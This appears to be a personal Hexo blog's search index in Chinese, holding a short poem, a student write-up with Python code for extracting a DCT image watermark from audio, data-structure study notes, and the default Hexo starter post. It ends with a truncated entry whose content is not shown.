<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>夜</title>
    <url>/2023/07/04/%E5%A4%9C/</url>
    <content><![CDATA[<p>夜晚不说话</p>
<p>只会生产寂寞</p>
<p>夜晚不洞察</p>
<p>只会导致沉默</p>
<br />

<p>入夜，</p>
<p>我才是我</p>
<p>黑暗才是脉搏</p>
<br />

<p>2022.11.12凌晨</p>
]]></content>
  </entry>
  <entry>
    <title>基于DCT技术的音频隐写破解</title>
    <url>/2023/12/06/DCT%E5%9B%BE%E7%89%87%E6%B0%B4%E5%8D%B0%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="尝试阶段"><a href="#尝试阶段" class="headerlink" title="尝试阶段"></a>尝试阶段</h2><p>使用Audacity工具观察音频的波形图和频谱图，什么信息也没发现。</p>
<p><img src="D:\PicGo\typoraimage\image-20231206211421312.png" alt="image-20231206211421312"></p>
<p>经过对手组提示，我们知道了他们对这段音频进行了LSB处理和DCT处理，而我讲负责DCT部分的解密。</p>
<h2 id="分析阶段"><a href="#分析阶段" class="headerlink" title="分析阶段"></a>分析阶段</h2><p>对手组使用DCT技术在音频中嵌入了图像水印。</p>
<p>数字水印技术是一种信息隐藏技术。音频数字水印算法就是将数字水印通过水印嵌入算法嵌入到音频文件中，例如（.wav、.mp3、.avi等），但人耳无法分辨嵌入前后的细微差别。</p>
<h3 id="傅里叶变换（DFT）"><a href="#傅里叶变换（DFT）" class="headerlink" title="傅里叶变换（DFT）"></a>傅里叶变换（DFT）</h3><p>傅里叶级数：将一个周期的信号分解成无限多离散的正弦波。（在时域是一个周期且连续的函数，在频域则是一个非周期离散的函数）</p>
<p>傅里叶变换：将一个时域非周期的连续信号，转换为一个在频域非周期的连续信号。</p>
<p><img src="D:\PicGo\typoraimage\image-20231207150257287.png" alt="image-20231207150257287"></p>
<p>DCT：即离散余弦变换，是一种特殊的DTF，即输入信号为实偶函数的DFT变换。将一个时域的信号转换到频域上。</p>
<p>经过查阅参考资料1，DCT水印算法的思想如下：</p>
<ol>
<li><p>将原始音频转换为多声道数组（m*n），因为容纳图片需要更大的数组。然后对数组进行分块，假设得到了n个块</p>
</li>
<li><p>将需要嵌入的图像水印转换为灰度图像，大小为w*h</p>
</li>
<li><p>随机生成k密钥。密钥的维度和块维度相同。</p>
</li>
<li><p>水印的每个像素点可以看作特征点，因此有feature&#x3D;w*h个特征点。（如果n&lt;&#x3D;feature，则无法嵌入该图像水印）</p>
</li>
<li><p>取出第i个特征点的像素值，计算出change[i] &#x3D; k[i] x pixel_value</p>
</li>
<li><p>计算第i个原始音频块的DCT系数，称为dct block</p>
</li>
<li><p>将change[i] 嵌入第i个dct block中的最后一行或者最后一列中，dct block[i, collum − 1]+ &#x3D; change[i]</p>
</li>
<li><p>计算第i个dct block的逆DCT并保存</p>
</li>
<li><p>重复上述5~8，直至所有特征点都嵌入完成</p>
</li>
<li><p>得到嵌入水印的音频</p>
</li>
</ol>
<p>PS：图片的像素点可以进行二值归一化，1代表黑色像素点，0表示白色像素点。</p>
<p><img src="D:\PicGo\typoraimage\image-20231207213429486.png" alt="image-20231207213429486"></p>
<h2 id="破解阶段"><a href="#破解阶段" class="headerlink" title="破解阶段"></a>破解阶段</h2><p>相应的，如果我们要从一段使用了DCT技术隐藏了图片水印的音频中提取出该水印，我们的步骤应该是：</p>
<ol>
<li><p>将音频数据按照一定长度分成多个块</p>
</li>
<li><p>对每个块进行DCT变换，得到DCT系数</p>
</li>
<li><p>从每个DCT系数中提取出嵌入的水印图像的像素值，得到时域图像</p>
</li>
<li><p>根据提取的像素值恢复水印图像</p>
</li>
</ol>
<p><img src="D:\PicGo\typoraimage\image-20231207213441830.png" alt="image-20231207213441830"></p>
<p>水印图片提取函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">DCT</span>(<span class="params">data</span>):</span><br><span class="line">    dct_audio = dct(data,norm =<span class="string">&#x27;ortho&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> dct_audio</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLastBit</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(number) <span class="keyword">in</span> (<span class="built_in">int</span>, np.int16, np.int64):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(number % <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>(number) <span class="keyword">in</span> (<span class="built_in">float</span>, np.float64):</span><br><span class="line">        whole, dec = splitFloat(number)</span><br><span class="line">        <span class="keyword">return</span> getLastBit(whole)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dct_extract</span>(<span class="params">audio,<span class="built_in">len</span>,random</span>):</span><br><span class="line">    numFrames = math.ceil(audio.shape[<span class="number">0</span>] / <span class="built_in">len</span>)</span><br><span class="line">    <span class="built_in">print</span>(numFrames)</span><br><span class="line">    numFrames = numFrames - <span class="number">1</span></span><br><span class="line">    frames = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numFrames):</span><br><span class="line">        frames.append(audio[i * <span class="built_in">len</span>: (i * <span class="built_in">len</span>) + <span class="built_in">len</span>])</span><br><span class="line">        <span class="comment"># 将小块存储在frame列表中</span></span><br><span class="line"></span><br><span class="line">    DCTCoeffs = np.zeros((numFrames, <span class="built_in">len</span>))</span><br><span class="line">    <span class="comment"># 创建二维数组，存储每个小块的DCT系数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numFrames):</span><br><span class="line">        DCTCoeffs[i] = DCT(frames[i])</span><br><span class="line">        <span class="comment"># 对每个小块进行DCT变换，将得到的DCT系数存储在二维数组中</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numFrames):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            audio0 = DCTCoeffs[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            audio0 = np.concatenate((audio0, DCTCoeffs[i]), axis=<span class="number">0</span>)</span><br><span class="line">            <span class="comment"># 将所有小块的DCT系数拼接成一维数组audio0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    width, heigth = (<span class="number">112</span>, <span class="number">112</span>)  <span class="comment"># sizeExtraction(joinAudio)</span></span><br><span class="line">    image = Image.new(<span class="string">&quot;1&quot;</span>, (width, heigth))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(heigth):</span><br><span class="line">            x = i * heigth + j</span><br><span class="line">            r = random[x]</span><br><span class="line">            value = getLastBit(audio0[r])</span><br><span class="line">            image.putpixel(xy=(i, j), value=value)</span><br><span class="line">            <span class="comment"># 根据提供的随机数组random，以及getLastBit函数，构建一个112x112的图片，将提取的水印信息写入图片中</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> image</span><br></pre></td></tr></table></figure>

<ol>
<li><p>对numFrames进行减1操作的目的是为了确保音频可以被完整地分成整数个长度为len的小块。</p>
<p>因为在处理音频时，通常将其分割成固定长度的小块进行处理，但是最后一个小块大概率没有填满整个长度len，所以将numFrames-1，以忽略最后一个不完整的小块。</p>
</li>
<li><p>DCT函数调用了numpy中的dct函数进行DCT变换</p>
</li>
<li><p>在将音频信号分成小块后，我们可以使用DCT变换将每个小块转换为其在频域上的表示。</p>
<p>在最后生成图片的过程中，我们可以使用经过处理的DCT系数来构建一张新的图像，以便显示水印信息。这样做的好处是，由于DCT系数对应于音频小块中不同的频率成分，因此可以用来更好地表示水印信息，并且可以减少由于噪声或其他干扰因素引起的误差。因此，使用DCT变换可以帮助我们更好地实现从音频中提取水印信息的目标。</p>
</li>
</ol>
<p>主函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    root = <span class="string">&quot;..&quot;</span></span><br><span class="line">    resultList = random.sample(<span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100000</span>), <span class="number">112</span>*<span class="number">112</span>)</span><br><span class="line">    frames = <span class="number">20</span></span><br><span class="line">    samplerate, data = wavfile.read(<span class="string">&quot;sample.wav&quot;</span>)</span><br><span class="line">    extract_watermark = dct_extract(audio=data,<span class="built_in">len</span>=frames,random = resultList)</span><br><span class="line">    extract_watermark.save(<span class="string">&quot;extract_watermark.png&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>得到的图片水印：</p>
<p><img src="D:\PicGo\typoraimage\image-20231207214702158.png" alt="image-20231207214702158"></p>
<p>参考资料:</p>
<ol>
<li><p>应用DCT实现对音频水印的添加和提取  [<a href="https://weipp7.gitee.io/posts/e1e00902.html#%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E6%80%9D%E8%B7%AF]">https://weipp7.gitee.io/posts/e1e00902.html#%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E6%80%9D%E8%B7%AF]</a></p>
</li>
<li><p>傅里叶分析之掐死教程（完整版）  韩昊  [<a href="https://zhuanlan.zhihu.com/p/19763358]">https://zhuanlan.zhihu.com/p/19763358]</a></p>
</li>
<li><p>信号处理–离散傅里叶变换（DFT） [<a href="https://blog.csdn.net/qq_45732223/article/details/109772898]">https://blog.csdn.net/qq_45732223/article/details/109772898]</a></p>
</li>
<li><p>数字音频信息隐藏课件 陈文</p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>数据结构</title>
    <url>/2023/07/23/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p>原文出自：图解算法数据结构 - LeetBook</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h2><p>数据大小：N</p>
<ul>
<li><p>时间复杂度统计的是「计算操作数量」, 而不是「运行的绝对时间」</p>
</li>
<li><p>体现的是计算操作随数据大小 N 变化时的变化情况</p>
</li>
<li><p>常见种类排列：<img src="D:\PicGo\typoraimage\image-20230916161030379.png" alt="image-20230916161030379"></p>
</li>
</ul>
<p><img src="D:\PicGo\typoraimage\image-20230916161036405.png" alt="image-20230916161036405"></p>
<p>PS： log<del>2</del> N 通常写作 log N</p>
<p>e.g.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">algorithm</span>(<span class="params">N</span>):</span><br><span class="line"><span class="keyword">if</span> N &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">count_1 = algorithm(N - <span class="number">1</span>)</span><br><span class="line">count_2 = algorithm(N - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> count_1 + count_2</span><br></pre></td></tr></table></figure>
<p>时间复杂度为O(2^N^)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">algorithm</span>(<span class="params">N</span>):</span><br><span class="line"><span class="keyword">if</span> N &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">count_1 = algorithm(N - <span class="number">1</span>)</span><br><span class="line">count_2 = algorithm(N - <span class="number">1</span>)</span><br><span class="line">count_3 = algorithm(N - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> count_1 + count_2 + count_3</span><br></pre></td></tr></table></figure>

<p>时间复杂度为O(3^N^)</p>
<p>对数阶常出现于「二分法」、「分治」等算法中，体现着 “一分为二” 或 “一分为多” 的算法思想。</p>
<h2 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h2><p>空间复杂度涉及的空间类型有：</p>
<ul>
<li>输入空间：存储输入数据所需的空间大小；</li>
<li>暂存空间：算法运行过程中，存储所有中间变量和对象等数据所需的空间大小；</li>
<li>输出空间：算法运行返回时，存储输出数据所需的空间大小；</li>
</ul>
<p><img src="D:\PicGo\typoraimage\image-20230916163330766.png" alt="image-20230916163330766"></p>
<p>通常情况下，空间复杂度指在输入数据大小为 N 时，算法运行所使用的「暂存空间」+「输出空间」的总体大小。</p>
<p>而根据不同来源，算法使用的内存空间分为三类：</p>
<ul>
<li><p>指令空间：编译后，程序指令所使用的内存空间。</p>
</li>
<li><p>数据空间：算法中的各项变量使用的空间，包括：声明的常量、变量、动态数组、动态对象等使用的内存空间。</p>
</li>
<li><p>栈帧空间：程序调用函数是基于栈实现的，函数在调用期间，占用常量大小的栈帧空间，直至返回后释放。</p>
</li>
<li><p>常见种类排列：<img src="D:\PicGo\typoraimage\image-20230916170644798.png" alt="image-20230916170644798"></p>
</li>
</ul>
<p><img src="D:\PicGo\typoraimage\image-20230916170653116.png" alt="image-20230916170653116"></p>
<h2 id="数据结构简介"><a href="#数据结构简介" class="headerlink" title="数据结构简介"></a>数据结构简介</h2><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组是将相同类型的元素存储于连续内存空间的数据结构，长度不可变。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] array = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="D:\PicGo\typoraimage\image-20230916180645749.png" alt="image-20230916180645749"></p>
<p>「可变数组」是经常使用的数据结构，其基于数组和扩容机制实现，相比普通数组更加灵活。常用操作有：访问元素、添加元素、删除元素。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化可变数组</span></span><br><span class="line">List&lt;Integer&gt; array = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">//向尾部添加元素</span></span><br><span class="line">array.add(<span class="number">2</span>);</span><br><span class="line">array.add(<span class="number">3</span>);</span><br><span class="line">array.add(<span class="number">1</span>);</span><br><span class="line">array.add(<span class="number">0</span>);</span><br><span class="line">array.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>



<h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p>链表以节点为单位，每个元素都是一个独立对象，在内存空间的存储是<strong>非连续</strong>的。链表的节点对象具有两个成员变量：「值 <code>val</code>」，「后继节点引用 <code>next</code>」 。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实例化节点</span></span><br><span class="line"><span class="type">ListNode</span> <span class="variable">n1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">4</span>); <span class="comment">// 节点 head</span></span><br><span class="line"><span class="type">ListNode</span> <span class="variable">n2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">5</span>);</span><br><span class="line"><span class="type">ListNode</span> <span class="variable">n3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建引用指向</span></span><br><span class="line">n1.next = n2;</span><br><span class="line">n2.next = n3;</span><br></pre></td></tr></table></figure>

<p><img src="D:\PicGo\typoraimage\image-20230916181128417.png" alt="image-20230916181128417"></p>
<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>栈是一种具有 「先入后出」 特点的抽象数据结构，可使用数组或链表实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br></pre></td></tr></table></figure>

<p>PS： python中，列表可以当栈使用</p>
<p>如下图所示，通过常用操作「入栈 <code>push()</code>」,「出栈 <code>pop()</code>」，展示了栈的先入后出特性。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">stack.push(<span class="number">1</span>); <span class="comment">// 元素 1 入栈</span></span><br><span class="line">stack.push(<span class="number">2</span>); <span class="comment">// 元素 2 入栈</span></span><br><span class="line">stack.pop();   <span class="comment">// 出栈 -&gt; 元素 2</span></span><br><span class="line">stack.pop();   <span class="comment">// 出栈 -&gt; 元素 1</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\PicGo\typoraimage\image-20230916181855600.png" alt="image-20230916181855600"></p>
<p>PS： 注意：通常情况下，不推荐使用 Java 的 <code>Vector</code> 以及其子类 <code>Stack</code> ，而一般将 <code>LinkedList</code> 作为栈来使用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LinkedList&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">stack.addLast(<span class="number">1</span>);   <span class="comment">// 元素 1 入栈</span></span><br><span class="line">stack.addLast(<span class="number">2</span>);   <span class="comment">// 元素 2 入栈</span></span><br><span class="line">stack.removeLast(); <span class="comment">// 出栈 -&gt; 元素 2</span></span><br><span class="line">stack.removeLast(); <span class="comment">// 出栈 -&gt; 元素 1</span></span><br></pre></td></tr></table></figure>



<h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>队列是一种具有 「先入先出」 特点的抽象数据结构，可使用链表实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Queue&lt;Integer&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br></pre></td></tr></table></figure>

<p>PS: LinkedList是</p>
<p>通过常用操作「入队 <code>offer()</code>」,「出队 <code>poll()</code>」，展示了队列的先入先出特性。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">queue.offer(<span class="number">1</span>); <span class="comment">// 元素 1 入队</span></span><br><span class="line">queue.offer(<span class="number">2</span>); <span class="comment">// 元素 2 入队</span></span><br><span class="line">queue.poll();   <span class="comment">// 出队 -&gt; 元素 1</span></span><br><span class="line">queue.poll();   <span class="comment">// 出队 -&gt; 元素 2</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\PicGo\typoraimage\image-20230916183306075.png" alt="image-20230916183306075"></p>
<h3 id="树"><a href="#树" class="headerlink" title="树"></a>树</h3><p>树是一种非线性数据结构，根据子节点数量可分为 「二叉树」 和 「多叉树」，最顶层的节点称为「根节点 <code>root</code>」。以二叉树为例，每个节点包含三个成员变量：「值 <code>val</code>」、「左子节点 <code>left</code>」、「右子节点 <code>right</code>」 。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> val;		<span class="comment">// 节点值</span></span><br><span class="line">    TreeNode left;	<span class="comment">// 左子节点</span></span><br><span class="line">    TreeNode right;	<span class="comment">// 右子节点</span></span><br><span class="line">    TreeNode(<span class="type">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>建立此二叉树需要实例化每个节点，并构建各节点的引用指向。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化节点</span></span><br><span class="line"><span class="type">TreeNode</span> <span class="variable">n1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(<span class="number">3</span>); <span class="comment">// 根节点 root</span></span><br><span class="line"><span class="type">TreeNode</span> <span class="variable">n2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(<span class="number">4</span>);</span><br><span class="line"><span class="type">TreeNode</span> <span class="variable">n3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(<span class="number">5</span>);</span><br><span class="line"><span class="type">TreeNode</span> <span class="variable">n4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">TreeNode</span> <span class="variable">n5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建引用指向</span></span><br><span class="line">n1.left = n2;</span><br><span class="line">n1.right = n3;</span><br><span class="line">n2.left = n4;</span><br><span class="line">n2.right = n5;</span><br></pre></td></tr></table></figure>

<p><img src="D:\PicGo\typoraimage\image-20230916184358517.png" alt="image-20230916184358517"></p>
<h3 id="图"><a href="#图" class="headerlink" title="图"></a>图</h3><p>图是一种非线性数据结构，由「节点（顶点）<code>vertex</code>」和「边  <code>edge</code>」组成，每条边连接一对顶点。根据边的方向有无，图可分为「有向图」和「无向图」。本文 <strong>以无向图为例</strong> 开展介绍。</p>
<p>如下图所示，此无向图的 <strong>顶点</strong> 和 <strong>边</strong> 集合分别为：</p>
<ul>
<li>顶点集合：<code>vertices = &#123;1, 2, 3, 4, 5&#125;</code></li>
<li>边集合：<code>edges = &#123;(1, 2), (1, 3), (1, 4), (1, 5), (2, 4), (3, 5), (4, 5)&#125;</code></li>
</ul>
<p><img src="D:\PicGo\typoraimage\image-20230916185349362.png" alt="image-20230916185349362"></p>
<p>表示图的方法通常有两种</p>
<ol>
<li><strong>邻接矩阵</strong>：使用数组 <code>vertice</code> 存储顶点，邻接矩阵 <code>edges</code> 存储边； <code>edges[i][j]</code> 代表节点 <code>i+1</code> 和 节点 <code>j+1</code> 之间是否有边。</li>
</ol>
<p><img src="D:\PicGo\typoraimage\image-20230916185709606.png" alt="image-20230916185709606"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] vertices = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="type">int</span>[][] edges = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">                 &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;,</span><br><span class="line">                 &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">                 &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">                 &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>邻接表： 使用数组 <code>vertices</code> 存储顶点，邻接表 <code>edges</code> 存储边。 <code>edges</code> 为一个二维容器，第一维 <code>i</code> 代表顶点索引，第二维 <code>edges[i]</code> 存储此顶点对应的边集和；例如 <code>edges[0]=[1,2,3,4]</code> 代表 <code>vertices[0]</code> 的边集合为 <code>[1,2,3,4]</code> 。（和<code>vertices[0]相邻的点有 vertices[1] [2] [3] [4]</code></p>
<p><img src="D:\PicGo\typoraimage\image-20230916191714964.png" alt="image-20230916191714964"></p>
</li>
</ol>
<blockquote>
<p><strong>邻接矩阵 VS 邻接表 ：</strong></p>
<p>邻接矩阵的大小只与节点数量有关，即 N^2^ ，其中 N 为节点数量。因此，当边数量明显少于节点数量时，使用邻接矩阵存储图会造成较大的内存浪费。</p>
<p>因此，邻接表 适合存储稀疏图（顶点较多、边较少）； 邻接矩阵 适合存储稠密图（顶点较少、边较多）。</p>
</blockquote>
<h3 id="散列表"><a href="#散列表" class="headerlink" title="散列表"></a>散列表</h3><p>散列表是一种非线性数据结构，通过利用 Hash 函数将指定的「键 <code>key</code>」映射至对应的「值 <code>value</code>」，以实现高效的元素查找。</p>
<blockquote>
<p>设想一个简单场景：小力、小特、小扣的学号分别为 10001, 10002, 10003 。</p>
<p>现需求从「姓名」查找「学号」。</p>
</blockquote>
<p>则可通过建立姓名为 <code>key</code> ，学号为 <code>value</code> 的散列表实现此需求</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化散列表</span></span><br><span class="line">Map&lt;String, Integer&gt; dic = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加 key -&gt; value 键值对</span></span><br><span class="line">dic.put(<span class="string">&quot;小力&quot;</span>, <span class="number">10001</span>);</span><br><span class="line">dic.put(<span class="string">&quot;小特&quot;</span>, <span class="number">10002</span>);</span><br><span class="line">dic.put(<span class="string">&quot;小扣&quot;</span>, <span class="number">10003</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从姓名查找学号</span></span><br><span class="line">dic.get(<span class="string">&quot;小力&quot;</span>); <span class="comment">// -&gt; 10001</span></span><br><span class="line">dic.get(<span class="string">&quot;小特&quot;</span>); <span class="comment">// -&gt; 10002</span></span><br><span class="line">dic.get(<span class="string">&quot;小扣&quot;</span>); <span class="comment">// -&gt; 10003</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\PicGo\typoraimage\image-20230916193525998.png" alt="image-20230916193525998"></p>
<h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p>堆是一种基于「完全二叉树」的数据结构，可使用数组实现。以堆为原理的排序算法称为「堆排序」，基于堆实现的数据结构为「优先队列」。堆分为「大顶堆」和「小顶堆」，大（小）顶堆：任意节点的值不大于（小于）其父节点的值。</p>
<blockquote>
<p>完全二叉树定义：设二叉树深度为 k ，若二叉树除第 k 层外的其他各层（第 1 至 k - 1 层）的节点达到最大个数，且处于第 k 层的节点都连续集中在最左边，则此二叉树为完全二叉树。</p>
</blockquote>
<p>如下图所示，为包含 <code>1, 4, 2, 6, 8</code> 元素的小顶堆。将堆（完全二叉树）中的结点按层编号，即可映射到右边的数组存储形式。</p>
<p><img src="D:\PicGo\typoraimage\image-20230916194131268.png" alt="image-20230916194131268"></p>
<p>通过使用「优先队列」的「压入 <code>push()</code>」和「弹出 <code>pop()</code>」操作，即可完成堆排序，实现代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化小顶堆</span></span><br><span class="line">Queue&lt;Integer&gt; heap = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 元素入堆</span></span><br><span class="line">heap.add(<span class="number">1</span>);</span><br><span class="line">heap.add(<span class="number">4</span>);</span><br><span class="line">heap.add(<span class="number">2</span>);</span><br><span class="line">heap.add(<span class="number">6</span>);</span><br><span class="line">heap.add(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 元素出堆（从小到大）</span></span><br><span class="line">heap.poll(); <span class="comment">// -&gt; 1</span></span><br><span class="line">heap.poll(); <span class="comment">// -&gt; 2</span></span><br><span class="line">heap.poll(); <span class="comment">// -&gt; 4</span></span><br><span class="line">heap.poll(); <span class="comment">// -&gt; 6</span></span><br><span class="line">heap.poll(); <span class="comment">// -&gt; 8</span></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/07/03/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>网络攻防技术复习</title>
    <url>/2024/01/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E5%A4%8D%E4%B9%A0/</url>
